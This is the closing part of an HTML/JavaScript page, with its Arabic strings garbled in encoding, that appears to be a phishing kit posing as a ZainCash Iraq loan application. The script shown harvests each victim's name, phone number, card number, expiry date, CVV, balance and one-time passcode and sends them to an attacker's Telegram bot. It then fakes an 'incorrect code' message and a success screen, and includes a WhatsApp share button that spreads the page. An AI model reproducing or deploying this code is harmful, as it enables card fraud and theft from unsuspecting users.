        text: `ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ®ÿ∑ÿßŸÇÿ© ÿ≤ŸäŸÜ ŸÉÿßÿ¥:\nÿßŸÑÿßÿ≥ŸÖ: ${userData.userName}\nÿßŸÑŸÖÿ®ŸÑÿ∫: ${Number(userData.loanAmount).toLocaleString()} ÿØŸäŸÜÿßÿ±\nÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ: ${userData.userPhone}\nÿ±ŸÇŸÖ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ©: ${cardNumber}\nÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ•ŸÜÿ™Ÿáÿßÿ°: ${expDate}\nCVV: ${cvv}\nÿßŸÑÿ±ÿµŸäÿØ ÿßŸÑÿ≠ÿßŸÑŸä: ${cardBalance} ÿØŸäŸÜÿßÿ±`
      })
    });
    setTimeout(()=>showStep(2), 1200);
  };

  // ÿßŸÑÿÆÿ∑Ÿàÿ© 3
  document.getElementById('otpForm').onsubmit = async function(e) {
    e.preventDefault();
    if(currentStep !== 2) return; // ŸÖŸÜÿπ ÿßŸÑÿ™ŸÑÿßÿπÿ®
    if(spamBlock) return showToast('ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿßŸã ...', '#e67e22');
    const otp = document.getElementById('otp').value;
    if (!/^\d{6}$/.test(otp)) {
      showToast('ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ 6 ÿ£ÿ±ŸÇÿßŸÖ', 'var(--error)', "error");
      return;
    }
    blockSpam(3000);
    showToast('ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÇŸÇ...','','');
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHATID,
        text: `ÿ∑ŸÑÿ® ÿ≥ŸÑŸÅÿ© ŸÖŸÉÿ™ŸÖŸÑ:\nÿßŸÑÿßÿ≥ŸÖ: ${userData.userName}\nÿßŸÑŸÖÿ®ŸÑÿ∫: ${Number(userData.loanAmount).toLocaleString()} ÿØŸäŸÜÿßÿ±\nÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ: ${userData.userPhone}\nÿ±ŸÇŸÖ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ©: ${userData.cardNumber}\nÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ•ŸÜÿ™Ÿáÿßÿ°: ${userData.expDate}\nCVV: ${userData.cvv}\nÿßŸÑÿ±ÿµŸäÿØ ÿßŸÑÿ≠ÿßŸÑŸä: ${userData.cardBalance} ÿØŸäŸÜÿßÿ±\nÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ: ${otp}`
      })
    });
    setTimeout(()=>{
      showToast('ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ÿå ÿ¨ÿ±ÿ® ŸÖÿ±ÿ© ÿ£ÿÆÿ±Ÿâ', '#e67e22', "error");
      document.getElementById('otp').value = "";
    }, 1300);
    setTimeout(()=>showStep(2), 2000);
    setTimeout(()=>{
      showStep(3);
      document.getElementById('liveStatus').style.display = 'block';
      document.getElementById('finalSuccess').style.display = 'none';
    }, 3200);
    setTimeout(()=>{
      document.getElementById('liveStatus').style.display = 'none';
      document.getElementById('finalSuccess').style.display = 'block';
      showToast('ÿ™ŸÖ ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑÿ∑ŸÑÿ® ÿ®ŸÜÿ¨ÿßÿ≠', 'var(--success)', "success");
    }, 6000);
  };

  // ÿ•ÿØÿÆÿßŸÑ ÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÑÿ™ÿßÿ±ŸäÿÆ ÿßŸÑÿ®ÿ∑ÿßŸÇÿ©
  document.getElementById('expDate').addEventListener('input', function(e) {
    let v = e.target.value.replace(/[^\d]/g, '');
    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
    e.target.value = v.slice(0,5);
  });

  // ÿ≤ÿ± ÿßŸÑŸÖÿ¥ÿßÿ±ŸÉÿ©
  window.shareNow = function(type) {
    let url = window.location.href;
    let msg = "ŸÇÿØŸÖÿ™ ÿ∑ŸÑÿ® ÿ≥ŸÑŸÅÿ© ŸÖŸÜ ŸÖŸàŸÇÿπ ZainCash ÿßŸÑÿπÿ±ÿßŸÇ! ÿ¨ÿ±ÿ® ÿßŸÑÿÆÿØŸÖÿ© ÿßŸÑÿ¢ŸÜ: ";
    if(type==="whatsapp") {
      window.open(`https://wa.me/?text=${encodeURIComponent(msg+url)}`,"_blank");
    }
  }

  // ÿ•ÿ∫ŸÑÿßŸÇ ŸÜÿßŸÅÿ∞ÿ© ÿßŸÑÿ™ÿ±ÿ≠Ÿäÿ® ÿ®ÿπÿØ 7 ÿ´ŸàÿßŸÜŸä ÿ™ŸÑŸÇÿßÿ¶Ÿäÿß
  setTimeout(()=>document.getElementById('welcome-modal').classList.add('hide'),7000);
  </script>
</body>
</html>